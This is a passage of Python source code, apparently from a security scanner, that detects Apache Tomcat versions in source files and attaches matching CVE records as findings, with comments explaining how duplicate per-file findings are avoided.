            r'org\.apache\.tomcat[^:]*:(\d+\.\d+\.\d+)',
            # Common in manifests
            r'Implementation-Version:\s*(\d+\.\d+\.\d+)',
        ]

        for pattern in code_version_patterns:
            match = re.search(pattern, code_content, re.IGNORECASE)
            if match:
                detected_version = match.group(1)
                logger.info(f"Detected Tomcat version from code: {detected_version}")
                return "apache_tomcat", detected_version

        # 4. Check for major version indicators in package names
        major_version_patterns = [
            (r'jakarta\.servlet', '10'),  # Tomcat 10+ uses jakarta
            (r'javax\.servlet\.http\.HttpServlet', '9'),  # Tomcat 9 uses javax
        ]

        for pattern, major_ver in major_version_patterns:
            if re.search(pattern, code_content):
                # Return with .0 assumption for conservative CVE matching
                assumed_version = f"{major_ver}.0.0"
                logger.info(f"Detected Tomcat major version {major_ver} from API usage. Assuming {assumed_version} for CVE matching.")
                return "apache_tomcat", assumed_version

        # If no version found but it's clearly Tomcat, return generic
        logger.info("Detected Apache Tomcat (version unknown)")
        return "apache_tomcat", "unknown"

    def get_cves_for_version(self, software_name, detected_version):
        """
        Returns list of CVEs applicable to the detected software version.
        """
        if software_name not in self.cve_data:
            return []

        matching_cves = []
        software_cves = self.cve_data[software_name]

        for cve in software_cves:
            if detected_version == "unknown":
                # User preference: Don't guess CVEs for unknown versions
                logger.info(f"Version unknown for {software_name}. Skipping CVE matching.")
                return []

            # Parse version
            try:
                ver_parts = detected_version.split('.')
                major_version = ver_parts[0]

                # Check if this major version is in affected_versions
                if major_version in cve["affected_versions"]:
                    affected_range = cve["affected_versions"][major_version]

                    # Simple range check
                    if self._version_in_range(detected_version, affected_range):
                        matching_cves.append(cve)
            except:
                # If version parsing fails, include CVE to be safe
                matching_cves.append(cve)

        return matching_cves

    def _version_in_range(self, ver, version_range):
        """
        Checks if version is within affected range.
        Range format: "X.Y.Z to X.Y.Z" or "X.Y.Z"
        """
        try:
            if " to " in version_range:
                start, end = version_range.split(" to ")
                start_ver = version.parse(start.strip())
                end_ver = version.parse(end.strip())
                ver_obj = version.parse(ver)
                return start_ver <= ver_obj <= end_ver
            else:
                # Single version match
                return ver == version_range.strip()
        except:
            # If parsing fails, assume vulnerable (conservative)
            return True

    def enrich_findings_with_cves(self, findings, code_content, file_path):
        """
        Enhances vulnerability findings with version-specific CVEs.

        Args:
            findings: List of vulnerability dicts from VulnScanner
            code_content: Source code
            file_path: File path

        Returns:
            Enhanced findings with CVE mappings
        """
        software, ver = self.detect_version(code_content, file_path)

        if not software:
            return findings

        cves = self.get_cves_for_version(software, ver)

        if not cves:
            return findings

        # Add CVE enrichment to findings
        logger.info(f"Found {len(cves)} applicable CVEs for {software} {ver}")

        # Create new findings for each CVE
        cve_findings = []
        for cve in cves:
            # CHECK RELEVANCE: Skip if file doesn't match relevant_files pattern
            # Deep Thinking:
            # If 'relevant_files' is NOT defined, we used to add it to EVERYTHING.
            # This causes massive duplication (e.g. 300 files * 8 CVEs = 2400 findings).
            # NEW LOGIC: If 'relevant_files' is missing, we check if we have a specific file match.
            # If not, we SHOULD NOT add it to this specific file finding.
            # The 'Global' handler in scan_stage_1.py will ensure these CVEs are reported ONCE for the project.
            
            if "relevant_files" in cve:
                if not re.search(cve["relevant_files"], file_path, re.IGNORECASE) and not re.search(cve["relevant_files"], code_content, re.IGNORECASE):
                    continue
            # If no relevant_files defined, this is a global CVE - skip per-file, handled by Global injection in scan_stage_1.py
            else:
                continue
            
            cve_finding = {
                "type": f"Version-Specific Vulnerability: {cve['description']}",
                "cwe": cve["cwe"],
                "cve": cve["cve_id"],
                "severity": cve["severity"],
                "cvss": cve.get("cvss", 0.0),
                "confidence": 0.95,  # High confidence for known CVEs
                "owasp": cve.get("owasp", "N/A"),
                "details": f"{cve['description']}. Affected versions: {cve.get('affected_versions', 'See CVE details')}",
                "exploit_available": cve.get("exploit_available", False),
                "exploit_notes": cve.get("exploit_notes", ""),
                "reasoning": f"Detected {software} version {ver}. This version is vulnerable to {cve['cve_id']} ({cve['cwe']}). " + cve.get("exploit_notes", "")
            }
            cve_findings.append(cve_finding)

        # Merge with existing findings
        return findings + cve_findings
